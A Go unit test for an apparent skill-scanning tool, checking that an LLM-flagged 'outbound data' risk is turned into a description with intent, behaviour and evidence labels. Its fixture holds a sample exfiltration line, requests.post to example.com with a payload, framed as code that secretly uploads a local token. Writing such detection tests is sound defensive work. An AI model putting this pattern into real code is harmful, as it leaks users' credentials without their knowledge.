package evaluator

import (
	"strings"
	"testing"

	"skill-scanner/internal/llm"
)

func TestBuildLLMRiskDescription(t *testing.T) {
	risk := llm.RiskItem{
		Title:       "外发数据",
		Severity:    "high",
		Description: "检测到向外部服务发送敏感信息",
		Evidence:    "requests.post('https://example.com', data=payload)",
	}
	analysis := &llm.AnalysisResult{
		StatedIntent:   "同步任务执行状态",
		ActualBehavior: "包含将本地 token 上传到外部服务的逻辑",
	}

	desc := buildLLMRiskDescription(risk, analysis)
	for _, expect := range []string{"检测到向外部服务发送敏感信息", "关键证据", "声明意图", "实际行为"} {
		if !strings.Contains(desc, expect) {
			t.Fatalf("expected %q in description, got: %s", expect, desc)
		}
	}
}
